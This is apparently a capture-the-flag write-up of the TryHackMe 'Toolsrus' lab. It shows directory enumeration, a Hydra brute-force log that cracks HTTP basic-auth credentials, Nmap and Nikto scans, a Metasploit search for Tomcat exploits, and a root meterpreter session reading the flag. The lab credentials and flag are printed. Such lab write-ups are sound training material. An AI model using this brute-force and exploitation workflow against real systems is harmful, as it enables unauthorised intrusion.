# 🚀 TryHackMe: Toolsrus — Write-Up  
**Room URL:** [https://tryhackme.com/room/toolsrus]
**Author:** *Irregular*  
**Date:** *14-06-2025*

---
## 📝 Overview  

> *This room is for to enhance enumeration skills and in result get access over the machine through the use of various tools *
>
> ## 🛠️ Tools Used  

-`Dirbuster`
-`Hydra`
-`Nmap`
-`Nikto`
-`Metasploit`

---
##RECON FINDINGS##

*Dirbuster*
![1](https://github.com/user-attachments/assets/59747491-483c-4faa-80ae-1f65a38d4cd5)

![image](https://github.com/user-attachments/assets/c4f2071d-138e-4741-9b26-966f57988782)
![image](https://github.com/user-attachments/assets/ab730d14-2d63-48a3-a4d7-487ad14756a0)
- first i tried to run dirbuster to checkfor all the directories that could be usefel for the entry point in the webservice 
- from this i found `/protected` to be intresting that uses only basic auth. and could be exploited through hydra
  

*hyra*
```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-30 02:58:31
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking http-get://10.10.95.199:80/protected/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "password" - 4 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "iloveyou" - 5 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "princess" - 6 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "1234567" - 7 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "rockyou" - 8 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "12345678" - 9 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "abc123" - 10 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "nicole" - 11 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "daniel" - 12 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "babygirl" - 13 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "monkey" - 14 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "lovely" - 15 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "jessica" - 16 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "654321" - 17 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "michael" - 18 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "ashley" - 19 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "qwerty" - 20 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "111111" - 21 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "iloveu" - 22 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "000000" - 23 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "michelle" - 24 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "tigger" - 25 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "sunshine" - 26 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "chocolate" - 27 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "password1" - 28 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "soccer" - 29 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "anthony" - 30 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "friends" - 31 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "butterfly" - 32 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "purple" - 33 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "angel" - 34 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "jordan" - 35 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "liverpool" - 36 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "justin" - 37 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "loveme" - 38 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "fuckyou" - 39 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "123123" - 40 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "football" - 41 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "secret" - 42 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "andrea" - 43 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "carlos" - 44 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "jennifer" - 45 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "joshua" - 46 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "bubbles" - 47 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "1234567890" - 48 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "superman" - 49 of 14344399 [child 0] (0/0)
[80][http-get] host: 10.10.95.199   login: bob   password: bubbles
[STATUS] attack finished for 10.10.95.199 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-30 02:58:47

```
boom!! the password was founded using hydra
*nmap*
```
 nmap -sS -sV -Pn -p- -A -T5 10.10.213.23
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 02:00 EDT
Warning: 10.10.213.23 giving up on port because retransmission cap hit (2).
Stats: 0:01:37 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 25.24% done; ETC: 02:07 (0:04:47 remaining)
Nmap scan report for 10.10.213.23
Host is up (0.17s latency).
Not shown: 65437 closed tcp ports (reset), 94 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b4:50:e7:e6:3f:85:18:48:1a:39:74:82:9b:58:34:46 (RSA)
|   256 94:f8:94:0f:3c:8b:8b:5e:9e:54:eb:1e:aa:58:13:1b (ECDSA)
|_  256 af:ff:aa:f5:40:cb:bd:b2:d8:f1:70:78:01:c9:c5:7c (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.88
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.4
OS details: Linux 4.4
Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT       ADDRESS
1   24.79 ms  10.17.0.1
2   ... 4
5   167.99 ms 10.10.213.23

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 486.40 seconds
```

**nikto**
```
nikto -h 10.10.213.23:80 -id bob:bubbles 
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.213.23
+ Target Hostname:    10.10.213.23
+ Target Port:        80
+ Start Time:         2025-07-01 01:50:37 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /: Server may leak inodes via ETags, header found with file /, inode: a8, size: 583d315d43a92, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS: Allowed HTTP Methods: POST, OPTIONS, GET, HEAD .
```
*metasploit*
```
search apache tomcat

Matching Modules
================

   #   Name                                                                       Disclosure Date  Rank       Check  Description
   -   ----                                                                       ---------------  ----       -----  -----------
   0   auxiliary/dos/http/apache_commons_fileupload_dos                           2014-02-06       normal     No     Apache Commons FileUpload and Apache Tomcat DoS
   1   exploit/multi/http/struts_dev_mode                                         2012-01-06       excellent  Yes    Apache Struts 2 Developer Mode OGNL Execution
   2   exploit/multi/http/struts2_namespace_ognl                                  2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
   3     \_ target: Automatic detection                                           .                .          .      .
   4     \_ target: Windows                                                       .                .          .      .
   5     \_ target: Linux                                                         .                .          .      .
   6   exploit/multi/http/struts_code_exec_classloader                            2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
   7     \_ target: Java                                                          .                .          .      .
   8     \_ target: Linux                                                         .                .          .      .
   9     \_ target: Windows                                                       .                .          .      .
   10    \_ target: Windows / Tomcat 6 & 7 and GlassFish 4 (Remote SMB Resource)  .                .          .      .
   11  auxiliary/admin/http/tomcat_ghostcat                                       2020-02-20       normal     Yes    Apache Tomcat AJP File Read
   12  exploit/windows/http/tomcat_cgi_cmdlineargs                                2019-04-10       excellent  Yes    Apache Tomcat CGIServlet enableCmdLineArguments Vulnerability
   13  exploit/multi/http/tomcat_mgr_deploy                                       2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
   14    \_ target: Automatic                                                     .                .          .      .
   15    \_ target: Java Universal                                                .                .          .      .
   16    \_ target: Windows Universal                                             .                .          .      .
   17    \_ target: Linux x86                                                     .                .          .      .
   18  exploit/multi/http/tomcat_mgr_upload                                       2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
   19    \_ target: Java Universal                                                .                .          .      .
   20    \_ target: Windows Universal                                             .                .          .      .
   21    \_ target: Linux x86                                                     .                .          .      .
   22  auxiliary/dos/http/apache_tomcat_transfer_encoding                         2010-07-09       normal     No     Apache Tomcat Transfer-Encoding Information Disclosure and DoS
   23  auxiliary/scanner/http/tomcat_enum                                         .                normal     No     Apache Tomcat User Enumeration
   24  exploit/linux/local/tomcat_rhel_based_temp_priv_esc                        2016-10-10       manual     Yes    Apache Tomcat on RedHat Based Systems Insecure Temp Config Privilege Escalation
   25  exploit/linux/local/tomcat_ubuntu_log_init_priv_esc                        2016-09-30       manual     Yes    Apache Tomcat on Ubuntu Log Init Privilege Escalation
   26  exploit/windows/http/cayin_xpost_sql_rce                                   2020-06-04       excellent  Yes    Cayin xPost wayfinder_seqid SQLi to RCE
   27  exploit/multi/http/cisco_dcnm_upload_2019                                  2019-06-26       excellent  Yes    Cisco Data Center Network Manager Unauthenticated Remote Code Execution
   28    \_ target: Automatic                                                     .                .          .      .
   29    \_ target: Cisco DCNM 11.1(1)                                            .                .          .      .
   30    \_ target: Cisco DCNM 11.0(1)                                            .                .          .      .
   31    \_ target: Cisco DCNM 10.4(2)                                            .                .          .      .
   32  exploit/linux/http/cpi_tararchive_upload                                   2019-05-15       excellent  Yes    Cisco Prime Infrastructure Health Monitor TarArchive Directory Traversal Vulnerability
   33  exploit/linux/http/cisco_prime_inf_rce                                     2018-10-04       excellent  Yes    Cisco Prime Infrastructure Unauthenticated Remote Code Execution
   34  exploit/multi/http/spring_framework_rce_spring4shell                       2022-03-31       manual     Yes    Spring Framework Class property RCE (Spring4Shell)
   35    \_ target: Java                                                          .                .          .      .
   36    \_ target: Linux                                                         .                .          .      .
   37    \_ target: Windows                                                       .                .          .      .
   38    \_ AKA: Spring4Shell                                                     .                .          .      .
   39    \_ AKA: SpringShell                                                      .                .          .      .
   40  auxiliary/admin/http/tomcat_administration                                 .                normal     No     Tomcat Administration Tool Default Access
   41  auxiliary/scanner/http/tomcat_mgr_login                                    .                normal     No     Tomcat Application Manager Login Utility
   42  exploit/multi/http/tomcat_partial_put_deserialization                      2025-03-10       excellent  Yes    Tomcat Partial PUT Java Deserialization
   43    \_ target: Unix Command                                                  .                .          .      .
   44    \_ target: Windows Command                                               .                .          .      .
   45  exploit/multi/http/tomcat_jsp_upload_bypass                                2017-10-03       excellent  Yes    Tomcat RCE via JSP Upload Bypass
   46    \_ target: Automatic                                                     .                .          .      .
   47    \_ target: Java Windows                                                  .                .          .      .
   48    \_ target: Java Linux                                                    .                .          .      .
   49  auxiliary/admin/http/tomcat_utf8_traversal                                 2009-01-09       normal     No     Tomcat UTF-8 Directory Traversal Vulnerability
   50  auxiliary/admin/http/trendmicro_dlp_traversal                              2009-01-09       normal     No     TrendMicro Data Loss Prevention 5.5 Directory Traversal
   51  post/windows/gather/enum_tomcat                                            .                normal     No     Windows Gather Apache Tomcat Enumeration


Interact with a module by name or index. For example info 51, use 51 or use post/windows/gather/enum_tomcat
```
![image](https://github.com/user-attachments/assets/a2a468f1-cfc5-4711-9701-dfb006f0269c)
```
meterpreter > getuid
Server username: root
meterpreter > ls
Listing: /
==========

Mode              Size      Type  Last modified              Name
----              ----      ----  -------------              ----
100667/rw-rw-rwx  190       fil   2025-07-01 01:48:31 -0400  .badr-info
040776/rwxrwxrw-  4096      dir   2019-03-11 02:13:25 -0400  bin
040776/rwxrwxrw-  4096      dir   2019-03-11 02:13:35 -0400  boot
040776/rwxrwxrw-  3280      dir   2025-07-01 01:48:21 -0400  dev
040776/rwxrwxrw-  4096      dir   2025-07-01 01:48:31 -0400  etc
040776/rwxrwxrw-  4096      dir   2019-03-10 17:52:32 -0400  home
100666/rw-rw-rw-  12713476  fil   2019-03-11 02:13:35 -0400  initrd.img
040776/rwxrwxrw-  4096      dir   2019-02-12 12:47:22 -0500  lib
040776/rwxrwxrw-  4096      dir   2019-02-12 12:28:02 -0500  lib64
040776/rwxrwxrw-  16384     dir   2019-02-12 12:37:53 -0500  lost+found
040776/rwxrwxrw-  4096      dir   2019-02-12 12:27:12 -0500  media
040776/rwxrwxrw-  4096      dir   2019-02-12 12:27:12 -0500  mnt
040776/rwxrwxrw-  4096      dir   2019-02-12 12:27:12 -0500  opt
040776/rwxrwxrw-  0         dir   2025-07-01 01:48:13 -0400  proc
040776/rwxrwxrw-  4096      dir   2019-03-11 12:06:14 -0400  root
040776/rwxrwxrw-  900       dir   2025-07-01 02:25:08 -0400  run
040776/rwxrwxrw-  12288     dir   2019-03-11 02:13:26 -0400  sbin
040776/rwxrwxrw-  4096      dir   2019-03-10 17:52:41 -0400  snap
040776/rwxrwxrw-  4096      dir   2019-02-12 12:27:12 -0500  srv
040776/rwxrwxrw-  0         dir   2025-07-01 01:48:15 -0400  sys
040776/rwxrwxrw-  4096      dir   2025-07-01 02:25:01 -0400  tmp
040776/rwxrwxrw-  4096      dir   2019-02-12 12:27:12 -0500  usr
040776/rwxrwxrw-  4096      dir   2019-03-10 18:19:00 -0400  var
100666/rw-rw-rw-  7030080   fil   2019-01-17 12:53:59 -0500  vmlinuz

meterpreter > cd root
meterpreter > ls
Listing: /root
==============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100667/rw-rw-rwx  47    fil   2019-03-11 12:06:14 -0400  .bash_history
100667/rw-rw-rwx  3106  fil   2015-10-22 13:15:21 -0400  .bashrc
040777/rwxrwxrwx  4096  dir   2019-03-11 11:30:33 -0400  .nano
100667/rw-rw-rwx  148   fil   2015-08-17 11:30:33 -0400  .profile
040777/rwxrwxrwx  4096  dir   2019-03-10 17:52:32 -0400  .ssh
100667/rw-rw-rwx  658   fil   2019-03-11 12:05:22 -0400  .viminfo
100666/rw-rw-rw-  33    fil   2019-03-11 12:05:22 -0400  flag.txt
040776/rwxrwxrw-  4096  dir   2019-03-10 17:52:43 -0400  snap

meterpreter > cat flag.txt
ff1fc4a81affcc7688cf89ae7dc6e0e1

```
